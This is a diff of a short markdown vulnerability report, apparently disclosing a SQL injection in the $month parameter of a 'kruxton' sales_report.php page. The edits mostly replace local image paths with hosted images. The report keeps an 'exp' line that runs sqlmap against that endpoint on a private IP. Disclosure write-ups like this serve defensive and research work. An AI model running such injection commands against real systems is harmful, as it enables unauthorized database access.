@@ -6,12 +6,13 @@ Vulnerability trigger parameter: $month
 
 The process of vulnerability discovery is as follows：
 
-![image-20230223220655535](C:\markdown\images\image-20230223220655535.png)
+![image](https://user-images.githubusercontent.com/30823782/220944878-8448837c-1455-4c6d-b78f-ee43b113f0ba.png)
+
 
 exp
 
 ```
 sqlmap.py -u "http://192.168.31.50/kruxton/sales_report.php?month=1"
 ```
+![image](https://user-images.githubusercontent.com/30823782/220944926-9add862a-c744-4940-a0dd-67b9d36eae2c.png)
 
-![image-20230223220621112](C:\markdown\images\image-20230223220621112.png)
